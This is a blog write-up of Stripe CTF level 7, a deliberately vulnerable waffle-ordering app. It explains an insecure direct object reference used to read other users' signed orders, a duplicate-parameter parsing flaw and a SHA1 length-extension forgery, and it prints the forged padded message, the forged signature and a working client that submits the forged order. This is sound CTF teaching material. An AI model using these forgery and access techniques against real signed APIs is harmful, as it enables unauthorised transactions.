Stripe CTF: Level #7
####################
:date: 2012-12-09 15:07
:author: useless
:category: Write-up
:slug: stripe-ctf-level-7
:status: published

.. image:: /images/stripe-ctf-level-7/level07-logo.jpg
    :alt: level07-logo.jpg
    :align: center

You can find the code for this level
`here </docs/stripe-ctf-level-7/stripe-ctf-level07.tar.gz>`__.

(sha256:
:code:`d497f25a620a2ad5e3850bf642cfc1df988e32b612d06f48fffa271912726e86`)

This level is the most delicious of all: you can order waffles online,
and the company will have them delivered to the location you specified.
There are seven types of waffle: veritaffle, belgian, brussels, eggo,
chicken (premium), dream (premium), and the king of waffles, liege
(premium). You have an unprivileged account (login: ctf, password:
password), so you can't order premium waffles. Yet, your goal is to
order the supreme waffle: the liege. There are four other users on the
website: larry (premium account), randall (premium account), alice and
bob. Every user has an ID, and a secret (which has the form of a random
string).

.. image:: /images/stripe-ctf-level-7/level07-ctf-user-interface.png
    :alt: level07-ctf-user-interface.png
    :align: center

The company provides you with a client API you can use to order waffles.
Every order is of the form:
:code:`count=XXX&lat=XXX&user_id=XXX&long=XXX&waffle=XXX`. Then, a
signature is computed using the client's secret, and appended to the
order. The signature is of the form:

.. code-block:: python

    # File client.py, line 61
    def _signature(self, message):
        h = hashlib.sha1()
        h.update(self.api_secret + message)
        return h.hexdigest() # signature = SHA1(secret + message)

We can view our past orders at the URL /logs/id.

.. image:: /images/stripe-ctf-level-7/level07-ctf-order.png
    :alt: level07-ctf-order.png
    :align: center

But what if we change the ID in the URL?

.. image:: /images/stripe-ctf-level-7/level07-larry-order.png
    :alt: level07-larry-order.png
    :align: center

.. image:: /images/stripe-ctf-level-7/level07-barry-order.png
    :alt: level07-barry-order.png
    :align: center

Bingo, we are now viewing larry's and randall's past orders. But since
they didn't order any liege, we can't use these orders as is. Let's see
in the code how the order is checked:

.. code-block:: python

    # File wafflecopter.py, line 139
    def parse_params(raw_params):
        pairs = raw_params.split('&')
        params = {}
        for pair in pairs:
            key, val = pair.split('=')
            key = urllib.unquote_plus(key)
            val = urllib.unquote_plus(val)
            params[key] = val
        return params

That's the code which parse the body of the order. We can see that they
don't check if a parameter has been specified more than once. So if you
send an order of the form: :code:`count=XXX&lat=XXX&user_id=XXX&long=XXX&waffle=XXX&waffle=YYY`,
the last waffle will be ordered (in this case, YYY).

Great, so we can just take a previous order from larry, append
:code:`&waffle=liege` to the end, and send it to the server!
Actually, we can't, because of the signature: if we change the order,
but not the signature, they won't match, and the server will refuse to
carry our order. So we need to change the signature. But how can we do
that without knowing larry's secret? The key here is cryptography.

Like we said earlier, the signature is computed via :code:`SHA1(secret +
message)`. But the SHA1 function follows the `Merkle–Damgård
construction <https://en.wikipedia.org/wiki/Merkle%E2%80%93Damg%C3%A5rd_construction>`__.
Basically, the message is broken up in equal blocks of 512 bits. Then,
computation is done on the first block and produces an output. This
output is used to perform the same computation on the second block, and
so on. So, it means that given :code:`SHA1(secret + message)` and the
and the length of :code:`secret`, we can compute :code:`SHA1(secret + message +
message_modifier)`. And that's exactly what we want, to append
something (here, :code:`&waffle=liege`) at the end of the message.

I started searching for a Python implementation of SHA1, and wanted to
modify it so that it would compute my forged signature, but it took too
much time. Fortunately, two guys I was working with on the CTF,
`lopi <https://twitter.com/_Lopi_>`__ and mark, found a script that
could forge the signature for us. The script was taken down since then,
but you can find another working one `here <https://gist.github.com/philfreo/3873715>`_.

.. code-block:: console

    $ python sha-padding.py
    usage: sha-padding.py <keylen> <original_message> <original_signature>
    <text_to_append>
    $ python sha-padding.py 14
    "count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo"
    78943cff885d4b41ff058aa64a36520e66ffdbbe "&waffle=liege"
    new msg:
    'count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&waffle=liege'
    base64:
    Y291bnQ9MTAmbGF0PTM3LjM1MSZ1c2VyX2lkPTEmbG9uZz0tMTE5LjgyNyZ3YWZmbGU9ZWdnb4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIoJndhZmZsZT1saWVnZQ==
    new sig: f7d4b492cc3282cd87e61624ee207ca496e807e4

Now, we just have to make the order:

.. code-block:: python

    # File forged_client.py
    import pycurl, urllib, StringIO

    def order():
        endpoint = 'http://localhost:9233'
        body =
            'count=10&lat=37.351&user_id=1&long=-119.827&waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&waffle=liege'
        signature = 'f7d4b492cc3282cd87e61624ee207ca496e807e4'
        body += "|sig:" + signature

        output = StringIO.StringIO()
        curl_object = pycurl.Curl()
        curl_object.setopt(pycurl.URL, endpoint + "/orders")
        curl_object.setopt(pycurl.POST, 1)
        curl_object.setopt(pycurl.POSTFIELDS, body)
        curl_object.setopt(pycurl.WRITEFUNCTION, output.write)
        curl_object.perform()
        curl_object.close()

        resp = output.getvalue()

        return resp

    def main():
        print order()

    if __name__ == "__main__":
        main()

.. code-block:: console

    $ python forged_client.py
    {"confirm_code": "dummy-password", "message": "Great news: 10 liege
    waffles will soon be flying your way!", "success": true}

w00t!

